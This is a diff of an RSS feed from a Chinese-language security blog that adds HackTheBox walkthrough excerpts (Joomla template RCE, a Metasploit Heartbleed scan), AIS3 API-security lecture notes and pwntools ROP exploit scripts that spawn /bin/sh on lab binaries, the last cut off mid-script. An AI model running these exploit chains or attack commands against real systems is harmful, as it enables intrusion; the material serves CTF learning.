@@ -1,4 +1,42 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on ErrorPro</title><link>https://ja-errorpro.codes/tags/ctf/</link><description>Recent content in Ctf on ErrorPro</description><generator>Hugo</generator><language>zh-Hant-TW</language><lastBuildDate>Thu, 05 Sep 2024 00:00:00 +0800</lastBuildDate><atom:link href="https://ja-errorpro.codes/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>【HTB Machine】Valentine</title><link>https://ja-errorpro.codes/posts/HTB/Valentine/</link><pubDate>Thu, 05 Sep 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Valentine/</guid><description>&lt;h1 id="htb-machinevalentine">【HTB Machine】Valentine&lt;/h1>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on ErrorPro</title><link>https://ja-errorpro.codes/tags/ctf/</link><description>Recent content in Ctf on ErrorPro</description><generator>Hugo</generator><language>zh-Hant-TW</language><lastBuildDate>Sun, 08 Sep 2024 00:00:00 +0800</lastBuildDate><atom:link href="https://ja-errorpro.codes/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>【HTB Machine】Curling</title><link>https://ja-errorpro.codes/posts/HTB/Curling/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Curling/</guid><description>&lt;h1 id="curling">Curling&lt;/h1>
+&lt;h2 id="掃描">掃描&lt;/h2>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image1.png" alt="image1">&lt;/p>
+&lt;h2 id="web">Web&lt;/h2>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image2.png" alt="image2">&lt;/p>
+&lt;p>使用 Joomla CMS&lt;/p>
+&lt;p>從 Source Code 看到 &lt;code>secret.txt&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image3.png" alt="image3">&lt;/p>
+&lt;p>從第一篇文推測 Super User 名稱是 &lt;code>Floris&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image4.png" alt="image4">&lt;/p>
+&lt;p>&lt;code>&amp;lt;url&amp;gt;/secret.txt&lt;/code> 有密碼&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image5.png" alt="image5">&lt;/p>
+&lt;p>&lt;code>&amp;lt;url&amp;gt;/administrator&lt;/code> 登入&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image6.png" alt="image6">&lt;/p>
+&lt;h2 id="rce">RCE&lt;/h2>
+&lt;p>在 template 新增利用 SSTI RCE&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image7.png" alt="image7">&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image8.png" alt="image8">&lt;/p>
+&lt;p>在家目錄有三個東西&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image9.png" alt="image9">&lt;/p>
+&lt;p>輸出來看看，看起來像 hexdump&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image10.png" alt="image10">&lt;/p>
+&lt;p>用維基百科查詢 magic header 發現是 bzip&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image11.png" alt="image11">&lt;/p>
+&lt;p>用 CyberChef 驗證，確實是 bzip&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image12.png" alt="image12">&lt;/p>
+&lt;p>解壓縮後變成 gzip&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image13.png" alt="image13">&lt;/p>
+&lt;p>Bzip 再解壓&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image14.png" alt="image14">&lt;/p>
+&lt;p>tar 解壓&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image15.png" alt="image15">&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image16.png" alt="image16">&lt;/p>
+&lt;p>拿到密碼，可以登入 SSH&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image17.png" alt="image17">&lt;/p>
+&lt;h1 id="user-pwned">User Pwned!!!&lt;/h1>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;p>翻一下 admin_area&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/curling/image18.png" alt="image18">&lt;/p></description></item><item><title>【HTB Machine】Valentine</title><link>https://ja-errorpro.codes/posts/HTB/Valentine/</link><pubDate>Thu, 05 Sep 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Valentine/</guid><description>&lt;h1 id="htb-machinevalentine">【HTB Machine】Valentine&lt;/h1>
 &lt;pre tabindex="0">&lt;code>LHOST: 10.10.16.13
 RHOST: 10.129.11.184
 &lt;/code>&lt;/pre>&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
@@ -18,7 +56,29 @@ RHOST: 10.129.11.184
 &lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap --script vuln 10.129.11.184
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/valentine/image2.png" alt="image2">&lt;/p></description></item><item><title>【AIS3】API 安全</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</guid><description>&lt;h1 id="api-安全">API 安全&lt;/h1>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/valentine/image2.png" alt="image2">&lt;/p>
+&lt;p>Heartbleed 有心臟出血漏洞&lt;/p>
+&lt;p>網路上很多 POC, 這邊直接開 metasploit 來攻擊&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfconsole
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>search openssl
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use auxiliary/scanner/ssl/openssl_heartbleed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> RHOSTS 10.129.11.184
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> verbose &lt;span style="color:#8be9fd;font-style:italic">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/valentine/image3.png" alt="image3">&lt;/p>
+&lt;p>有一串看起來像 Base64 的字串，拿去解密&lt;/p></description></item><item><title>【AIS3】API 安全</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</guid><description>&lt;h1 id="api-安全">API 安全&lt;/h1>
 &lt;p>&lt;code>-中華資安國際 資安研究員 zodius&lt;/code>&lt;/p>
 &lt;h2 id="技術簡介">技術簡介&lt;/h2>
 &lt;h3 id="what-is-api">What is API?&lt;/h3>
@@ -71,7 +131,35 @@ RHOST: 10.129.11.184
 &lt;li>header - 方法&lt;/li>
 &lt;li>body - 正式請求&lt;/li>
 &lt;/ul>
-&lt;p>Google hacking wsdl 可能可以找到很多酷東西&lt;/p></description></item><item><title>【AIS3】Cloud Security</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</guid><description>&lt;h1 id="cloud-security">Cloud Security&lt;/h1>
+&lt;p>Google hacking wsdl 可能可以找到很多酷東西&lt;/p>
+&lt;p>可從中獲得網站資訊&lt;/p>
+&lt;h3 id="restful-api">RESTful API&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>解決範圍定義問題&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Header&lt;/p>
+&lt;ul>
+&lt;li>method
+&lt;ul>
+&lt;li>GET&lt;/li>
+&lt;li>POST&lt;/li>
+&lt;li>PUT&lt;/li>
+&lt;li>DELETE&lt;/li>
+&lt;li>HEAD&lt;/li>
+&lt;li>OPTIONS&lt;/li>
+&lt;li>CONNECT&lt;/li>
+&lt;li>TRACE&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>URL&lt;/li>
+&lt;li>version
+&lt;img src="https://www.cloud4y.ru/upload/medialibrary/4c0/hn5x5w7tx2pa0t3m1us71vh51dthf4kg/2.jpg" alt="image">&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Representational State Transfer 狀態轉移&lt;/p></description></item><item><title>【AIS3】Cloud Security</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</guid><description>&lt;h1 id="cloud-security">Cloud Security&lt;/h1>
 &lt;p>&lt;code>-中華資安國際 資安研究員 黃聖筌 Husky&lt;/code>&lt;/p>
 &lt;h2 id="雲端基本介紹">雲端基本介紹&lt;/h2>
 &lt;h3 id="為啥上雲">為啥上雲&lt;/h3>
@@ -336,7 +424,234 @@ RHOST: 10.129.11.184
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【AIS3】永不停歇的競逐 - 威脅研究員與資安女力的挑戰</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</guid><description>&lt;h1 id="永不停歇的競逐---威脅研究員與資安女力的挑戰">永不停歇的競逐 - 威脅研究員與資安女力的挑戰&lt;/h1>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#ff79c6">=&lt;/span> context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> ELF(&lt;span style="color:#f1fa8c">&amp;#39;./rop1&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;35.229.243.81&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">10101&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;/bin/sh&lt;/span>&lt;span style="color:#f1fa8c">\x00&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendlineafter(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;What is your name? &amp;#34;&lt;/span>, payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x44fd87&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x401f4f&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax_rdx_rbx &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x485baa&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>name &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x4c7300&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syscall &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x401d04&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>recvuntil(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;You have a buffer overflow vuln: &amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>offset &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">24&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>padding &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>&lt;span style="color:#bd93f9">24&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> flat([padding, pop_rdi, name, pop_rax_rdx_rbx, &lt;span style="color:#bd93f9">59&lt;/span>, &lt;span style="color:#bd93f9">0&lt;/span>, &lt;span style="color:#bd93f9">0&lt;/span>, syscall])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="stack-pivot">Stack Pivot&lt;/h2>
+&lt;h3 id="lab02-solution">lab02 solution&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#ff79c6">=&lt;/span> context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> ELF(&lt;span style="color:#f1fa8c">&amp;#39;./rop2&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;35.229.243.81&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">10102&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leave_ret &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x4017ee&lt;/span> &lt;span style="color:#6272a4"># leave = mov rsp, rbp ; pop rbp ;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x401f4f&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x409f7e&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdx_rbx &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x485bab&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x44fd87&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>name &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x4c7300&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syscall &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x401d04&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
